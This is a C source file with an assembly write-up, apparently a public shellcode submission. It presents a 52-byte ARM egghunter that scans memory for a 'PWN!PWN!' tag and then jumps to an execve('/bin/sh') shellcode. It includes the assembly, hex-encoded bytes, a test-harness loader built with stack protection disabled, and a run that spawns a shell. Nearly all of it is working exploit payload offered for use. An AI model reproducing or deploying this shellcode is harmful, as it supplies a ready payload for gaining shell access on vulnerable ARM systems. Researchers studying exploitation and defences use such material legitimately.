/*
# Title:  Linux/ARM - sigaction() Based Egghunter (PWN!) + execve("/bin/sh", NULL, NULL) Shellcode (52 Bytes)
# Date:   2018-09-24
# Tested: armv7l (Raspberry Pi 3 Model B+)
# Author: Ken Kitahara

[System Information]
pi@raspberrypi:~ $ uname -a
Linux raspberrypi 4.14.52-v7+ #1123 SMP Wed Jun 27 17:35:49 BST 2018 armv7l GNU/Linux
pi@raspberrypi:~ $ lsb_release -a
No LSB modules are available.
Distributor ID:	Raspbian
Description:	Raspbian GNU/Linux 9.4 (stretch)
Release:	9.4
Codename:	stretch
pi@raspberrypi:~ $


[Procedure]
(1) Create main shellcode in THUMB state. This PoC's example is execve("/bin/sh", NULL, NULL) shellcode. (20 Bytes)
pi@raspberrypi:~ $ cat shell.s
.section .text
.global _start

_start:
    .THUMB
    // execve("/bin/sh", NULL, NULL)
    adr  r0, spawn
    eor  r1, r1, r1
    eor  r2, r2, r2
    strb r2, [r0, #endline-spawn-1]
    mov  r7, #11
    svc  #1

spawn:
.ascii "/bin/shX"
endline:
pi@raspberrypi:~ $ as -o shell.o shell.s && ld -N -o shell shell.o
pi@raspberrypi:~ $ objcopy -O binary shell shell.bin
pi@raspberrypi:~ $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' shell.bin && echo
\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x58
pi@raspberrypi:~ $


(2) Create egghunting shellcode. (52 Bytes)
pi@raspberrypi:~ $ cat egghunter.s
.section .text
.global _start

_start:
    .ARM
    add  lr, pc, #1
    bx   lr

    .THUMB
    eor  r1, r1, r1
    mov  r3, #0xff

page_align:
    orr  r1, r3
    ldr  r4, egg
next_addr:
    mov  r7, #0x43
    add  r1, r1, #1
    svc  #1
    sub  r7, r7, #0x51
    cmp  r0, r7
    beq  page_align
    ldr  r2, [r1]
    cmp  r2, r4
    bne  next_addr
    add  r1, #4
    ldr  r2, [r1]
    cmp  r2, r4
    bne  next_addr
    add  r1, #4
    mov  pc, r1
    eor  r7, r7, r7

egg:
.ascii "PWN!"
pi@raspberrypi:~ $ as -o egghunter.o egghunter.s && ld -N -o egghunter egghunter.o
pi@raspberrypi:~ $ objcopy -O binary egghunter egghunter.bin
pi@raspberrypi:~ $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' egghunter.bin && echo
\x01\xe0\x8f\xe2\x1e\xff\x2f\xe1\x49\x40\xff\x23\x19\x43\x08\x4c\x43\x27\x01\x31\x01\xdf\x51\x3f\xb8\x42\xf7\xd0\x0a\x68\xa2\x42\xf6\xd1\x04\x31\x0a\x68\xa2\x42\xf2\xd1\x04\x31\x8f\x46\x7f\x40\x50\x57\x4e\x21
pi@raspberrypi:~ $


[Operation Test]
pi@raspberrypi:~ $ gcc -fno-stack-protector -z execstack loader.c -o loader
pi@raspberrypi:~ $ ./loader
Egghunting Shellcode Length: 52
Shellcode Length: 28
$ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
$ exit
pi@raspberrypi:~ $

*/

#include<stdio.h>
#include<string.h>

unsigned char shell[] = \
// Egg Tag (4 Bytes * 2)
"PWN!PWN!"
// execve("/bin/sh", NULL, NULL) Shellcode (20 Bytes)
"\x02\xa0\x49\x40\x52\x40\xc2\x71"
"\x0b\x27\x01\xdf\x2f\x62\x69\x6e"
"\x2f\x73\x68\x58";

// Egghunting Shellcode (52 Bytes)
unsigned char sc[] = \
"\x01\xe0\x8f\xe2\x1e\xff\x2f\xe1"
"\x49\x40\xff\x23\x19\x43\x08\x4c"
"\x43\x27\x01\x31\x01\xdf\x51\x3f"
"\xb8\x42\xf7\xd0\x0a\x68\xa2\x42"
"\xf6\xd1\x04\x31\x0a\x68\xa2\x42"
"\xf2\xd1\x04\x31\x8f\x46\x7f\x40"
"\x50\x57\x4e\x21";

void main()
{
    printf("Egghunting Shellcode Length: %d\n", strlen(sc));
    printf("Shellcode Length: %d\n", strlen(shell));

    int (*ret)() = (int(*)())sc;

    ret();
}